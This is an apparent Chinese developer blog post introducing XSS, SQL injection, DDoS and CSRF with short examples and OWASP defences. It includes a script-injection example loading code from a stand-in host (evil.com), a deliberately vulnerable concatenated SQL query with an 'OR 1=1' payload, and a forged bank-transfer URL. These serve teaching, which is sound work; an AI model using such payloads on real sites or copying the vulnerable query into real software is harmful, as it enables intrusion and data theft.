搞 Web 开发离不开安全这个话题，确保网站或者网页应用的安全性，是每个开发人员都应该了解的事。本篇主要简单介绍在 Web 领域几种常见的攻击手段。

## 1. Cross Site Script（XSS， 跨站脚本攻击)

首先插播一句，为毛叫 XSS，缩写明显是 CSS 啊？没错，为了防止与我们熟悉的 CSS（Cascading Style Sheets）混淆，所以干脆更名为 XSS。

那 XSS 是什么呢？一言蔽之，XSS 就是攻击者在 Web 页面中插入恶意脚本，当用户浏览页面时，促使脚本执行，从而达到攻击目的。XSS 的特点就是想尽一切办法在目标网站上执行第三方脚本。

![](http://i.imgur.com/7lWrgbX.png)

( 图片来源：[XSS Tutorial](https://hackertarget.com/xss-tutorial/) )

举个例子。原有的网站有个将数据库中的数据显示到页面的上功能，`document.write("data from server")`。但如果服务器没有验证数据类型，直接接受任何数据时，攻击者可以会将 `<script src='http:bad-script.js'></scirpt>` 当做一个数据写入数据库。当其他用户请求这个数据时，网站原有的脚本就会执行 `document.write("<script src='http://www.evil.com/bad-script.js'></scirpt>")`，这样，便会执行 `bad-script.js`。如果攻击者在这段第三方的脚本中写入恶意脚本，那么普通用户便会受到攻击。

XSS 主要有三种类型：

- 存储型 XSS： 注入的脚本永久的存在于目标服务器上，每当受害者向服务器请求此数据时就会重新唤醒攻击脚本；
- 反射型 XSS： 当用受害者被引诱点击一个恶意链接，提交一个伪造的表单，恶意代码便会和正常返回数据一起作为响应发送到受害者的浏览器，从而骗过了浏览器，使之误以为恶意脚本来自于可信的服务器，以至于让恶意脚本得以执行。

  ![](http://i.imgur.com/ineKGTP.gif)    

  （ 图片来源： [Cross-Site Scripting (XSS)](http://hwang.cisdept.cpp.edu/swanew/Code.aspx?m=XSS) ）

- DOM 型 XSS： 有点类似于存储型 XSS，但存储型 XSS 是将恶意脚本作为数据存储在服务器中，每个调用数据的用户都会受到攻击。但 DOM 型 XSS 则是一个本地的行为，更多是本地更新 DOM 时导致了恶意脚本执行。

那么如何防御 XSS 攻击呢？

- 从客户端和服务器端双重验证所有的输入数据，这一般能阻挡大部分注入的脚本
- 对所有的数据进行适当的编码
- 设置 HTTP Header： "X-XSS-Protection: 1"


## 2. SQL Injection （SQL 注入）

所谓 SQL 注入，就是通过客户端的输入把 SQL 命令注入到一个应用的数据库中，从而得以执行恶意 SQL 语句。

先看个例子。

``` sql
uname = request.POST['username']
password = request.POST['password']

sql = "SELECT all FROM users WHERE username='" + uname + "' AND password='" + password + "'"

database.execute(sql)
```

上面这段程序直接将客户端传过来的数据写入到数据库。试想一下，如果用户传入的 `password` 值是： "password’ OR 1=1"，那么 sql 语句便会变成：

```
sql = "SELECT all FROM users WHERE username='username' AND password='password' OR 1=1"
```

那么，这句 sql 无论 `username` 和 `password` 是什么都会执行，从而将所有用户的信息取出来。

那么怎么预防 sql 的问题呢？

想要提出解决方案，先看看 sql 注入得以施行的因素：

- 网页应用使用 SQL 来控制数据库
- 用户传入的数据直接被写入数据库

根据 [OWASP](https://en.wikipedia.org/wiki/OWASP)，下面看看具体的预防措施。

- Prepared Statements (with Parameterized Queries)： 参数化的查询语句可以强制应用开发者首先定义所有的 sql 代码，之后再将每个参数传递给查询语句
- Stored Procedures： 使用语言自带的存储程序，而不是自己直接操纵数据库
- White List Input Validation： 验证用户的输入
- Escaping All User Supplied Input： 对用户提供的所有的输入都进行编码

## 3. Distributed Denial of Service （DDoS， 分布式拒绝服务）

DoS 攻击就是通过大量恶意流量占用带宽和计算资源以达到瘫痪对方网络的目的。

举个简单的例子，老郑家面馆生意红火，突然有一天一群小混混进了点，霸占了座位，只闲聊不点菜，结果坐在店里的人不吃面，想吃面的人进不来，导致老郑无法向正常客户服务。

而 DDoS 攻击就是将多个计算机联合起来一同向目标发起攻击，从而成倍地提高拒绝服务攻击的威力。

![](http://i.imgur.com/3LQAriN.png)

（图片来源于： [DDoSCoin - An Incentive to Launch DDoS Attacks?](http://www.bleepingcomputer.com/news/security/ddoscoin-an-incentive-to-launch-ddos-attacks/)）

一般 DDoS 攻击有两个目的：

- 敲诈勒索，逼你花钱买平安
- 打击竞争对手

在技术角度上，DDoS攻击可以针对网络通讯协议的各层，手段大致有：TCP类的SYN Flood、ACK Flood，UDP类的Fraggle、Trinoo，DNS Query Flood，ICMP Flood，Slowloris类、各种社工方式等等，这些技术这里不做详细解释。但是一般会根据攻击目标的情况，针对性的把技术手法混合，以达到最低的成本最难防御的目的，并且可以进行合理的节奏控制，以及隐藏保护攻击资源。

阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是检测技术和清洗技术。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。而检测技术的核心在于对业务深刻的理解，才能快速精确判断出是否真的发生了 DDoS 攻击。清洗技术对检测来讲，不同的业务场景下要求的粒度不一样。

## 4. Cross Site Request Forgery (CSRF， 跨站请求伪造)

简单来说，CSRF 就是网站 A 对用户建立信任关系后，在网站 B 上利用这种信任关系，跨站点向网站 A 发起一些伪造的用户操作请求，以达到攻击的目的。

举个例子。网站 A 是一家银行的网站，一个转账接口是 "http://www.bankA.com/transfer?toID=12345678&cash=1000"。toID 表示转账的目标账户，cash 表示转账数目。当然这个接口没法随便调用，只有在已经验证的情况下才能够被调用。

此时，攻击者建立了一个 B 网站，里面放了一段隐藏的代码，用来调用转账的接口。当受害者先成功登录了 A 网站，短时间内不需要再次验证，这个时候又访问了网站 B，B 里面隐藏的恶意代码就能够成功执行。

那怎么预防 CSRF 攻击呢？[OWASP](https://en.wikipedia.org/wiki/OWASP) 推荐了两种检查方式来作为防御手段。

- 检查标准头部，确认请求是否同源： 检查 source origin 和 target origin，然后比较两个值是否匹配
- 检查 CSRF Token： 主要有四种推荐的方式
  - Synchronizer Tokens： 在表单里隐藏一个随机变化的 token，每当用户提交表单时，将这个 token 提交到后台进行验证，如果验证通过则可以继续执行操作。这种情况有效的主要原因是网站 B 拿不到网站 A 表单里的 token;
  - Double Cookie Defense： 当向服务器发出请求时，生成一个随机值，将这个随机值既放在 cookie 中，也放在请求的参数中，服务器同时验证这两个值是否匹配；
  - Encrypted Token Pattern： 对 token 进行加密
  - Custom Header： 使用自定义请求头部，这个方式依赖于同源策略。其中最适合的自定义头部便是： "X-Requested-With: XMLHttpRequest"



参考：

1. [Cross-site scripting -- MDN](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
2. [XSS Tutorial](https://hackertarget.com/xss-tutorial/)
3. 微信公众号【给产品经理讲技术】 -- Web安全之CSRF攻击
4. [Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
5. [SQL Injection (SQLi)](http://www.acunetix.com/websitesecurity/sql-injection/)
6. [SQL Injection](https://www.owasp.org/index.php/SQL_Injection)
7. [SQL Injection Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)
8. [DDoS，并没有想象中那么可怕](http://mp.weixin.qq.com/s?src=3&timestamp=1474965332&ver=1&signature=6ul**cPZ8ItdVuKUYDetdNVAyXa850UO7rhk8JBc5hv-SCsyHbogXnwcexXxhdLfsKw6g-mObWpS918kuWsPPCqR5vpbf2uC-2pesI79kGz3x1V9-*GmKGoC1IIodcTq9w8Z8ffmnSoxO6vw6d8IOQ==)
9. [互联网黑市分析：DDoS 启示录](http://mp.weixin.qq.com/s?src=3&timestamp=1474965332&ver=1&signature=ZK3-GqR3AKnum58MPSRUUtuDpZ5ykn8WLvTgI4sddP5Rtga8QKS7fwWm9Yz7PUki0I0V5ZhJijD2xbnh2oidcZ6FGHa94xV9jmWV6EdLEfHI1ol3KRXqlL9fr-aU1ZWSHuCB8b7896MIziROxFbJOA==)
10. [DDoS，网络安全世界里的暗黑杀手](http://mp.weixin.qq.com/s?src=3&timestamp=1475024663&ver=1&signature=rI*ApZSTzdk20BrHyMgaF9eKgT77oadaMtoePyV-BXLh06DIGknOaNgwXcDbVe-zgDhG2kva33aPeaiSNkVTye3IEUXM7*55l5JNjWXo7VhMS7TQJfEkoHEBwixtivlwRuI2TX117I-YIUxCDY7KlA==)
